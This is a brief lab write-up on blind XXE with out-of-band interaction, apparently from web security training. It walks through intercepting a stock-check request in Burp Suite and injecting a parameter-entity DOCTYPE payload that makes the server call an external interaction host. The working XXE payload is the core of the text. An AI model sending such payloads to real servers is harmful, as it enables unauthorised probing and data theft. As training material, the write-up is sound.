# Lab: Blind XXE with out-of-band interaction via XML parameter entities #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/0feda49c-9a01-4535-afea-219c9b84289f)

> Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/d35c9c8c-65ca-43b9-9dda-7b1e10bf006c)

> We have intercepted  the request and now we will add the payload
```
  <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://hwhuga0ncvjbjq8wgzqu9hozxq3hrbf0.oastify.com"> %xxe; ]>
```
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/e0187232-974a-451e-8e16-7f3d72ca7096)

> We got the secret `5c8c540z8s7zy0v2nbf7a1zjjgmgz`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ca74c294-22d9-4225-be88-71da6bb57fdf)
